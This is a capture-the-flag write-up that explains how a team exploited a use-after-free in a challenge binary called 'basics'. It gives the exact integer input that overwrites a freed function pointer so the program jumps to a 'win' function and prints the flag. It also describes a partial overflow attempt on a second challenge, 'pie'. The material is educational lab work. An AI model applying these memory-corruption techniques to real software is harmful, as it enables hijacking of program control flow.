## Exploitation

Only basics was solved by our team.

### Basics ###

Back to basics.  (See what I did there? :wink:)

`basics` is an ELF executable that listens on port 2222 and forks for each connection.  Here is a sample interaction:

```
$ nc <redacted> 2222
Creating the function pointer struct...
Doing something with the function pointer struct...
Freeing the function pointer struct...
Creating the integer struct...
Enter 3 integers, separated by newlines:
> 233
>
>
Those integers are: 233, 0, 0,
Freeing the integer struct...
Doing something with the (now free'd) function pointer struct...
```

From this interaction, it may become apparent that there is something shifty going on with the two `struct`s.
At this point, it may be useful to decompile or debug the binary.

Upon inspecting the symbols in the provided ELF binary, you would notice a symbol named `win` at offset address `0x08048953`.
This is a function that needs to be run in order to get the flag.
Converted to decimal, this address is `134515027`.

Hmm. What happens if we paste this address as the inputs?

Turns out, the integer struct uses the same memory space as the freed function pointer `struct`.
The program then attempts to call the function at the function pointer (which has now been overwritten by our address).

So assuming we pasted in the address thrice (as we're supposed to):

```
$ nc <redacted> 2222
Creating the function pointer struct...
Doing something with the function pointer struct...
Freeing the function pointer struct...
Creating the integer struct...
Enter 3 integers, separated by newlines:
> 134515027
> 134515027
> 134515027
Those integers are: 134515027, 134515027, 134515027,
Freeing the integer struct...
Doing something with the (now free'd) function pointer struct...
Congratulations! The key is: 1BV<redacted>XMh
```

### pie

Our team didn't finish pie, but we found several odd behaviours.
The largest being that if you pass it an input of > 28 characters, valgrind detects an invalid jump to a pointer.
This is an indication of trying to run an invalid function pointer.

@cyphar discovered that passing an input of `echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x00\x00\x00\x00"` would cause the program to try to jump to 0x0.
Since pie was PIC (position independant code/executable) (due to DEP and ASLR), the pointers in the symbol table were not pointers you could jump to at runtime.
This is where our team got stuck.

Sure, we could find a symbol called `sistem`, which called `system` (thanks IDA!).
But the pointer to that function `0x963` wouldn't be the correct pointer at runtime and pie wouldn't jump to it. `grrrr`
